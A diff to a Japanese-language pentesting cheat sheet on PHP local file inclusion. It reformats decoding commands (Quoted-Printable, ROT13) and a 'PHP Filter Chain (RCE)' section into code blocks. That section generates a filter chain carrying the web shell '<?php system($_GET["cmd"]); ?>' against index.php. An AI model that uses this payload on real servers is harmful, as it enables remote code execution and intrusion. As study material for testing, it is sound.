@@ -20,11 +20,15 @@ Base64エンコード読み込み
 
 ### Quoted-Printable をデコードする (Pythonを使用)
 
-`echo "=3C?php..." | python3 -c "import quopri, sys; print(quopri.decodestring(sys.stdin.read().encode()).decode())"`
+```
+echo "=3C?php..." | python3 -c "import quopri, sys; print(quopri.decodestring(sys.stdin.read().encode()).decode())"
+```
 
 ### ROT13 を元に戻す
 
-`echo "<?cuc..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+```
+echo "<?cuc..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
 
 
 # PHP Filter Chain (RCE)
@@ -33,6 +37,10 @@ Base64エンコード読み込み
 
 ### 使用ツール
 
-`python3 php_filter_chain_generator.py --data '<?php system($_GET["cmd"]); ?>'`
+```
+python3 php_filter_chain_generator.py --data '<?php system($_GET["cmd"]); ?>'
+```
 
-`php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...（中略）.../resource=index.php`
+```
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...（中略）.../resource=index.php
+```
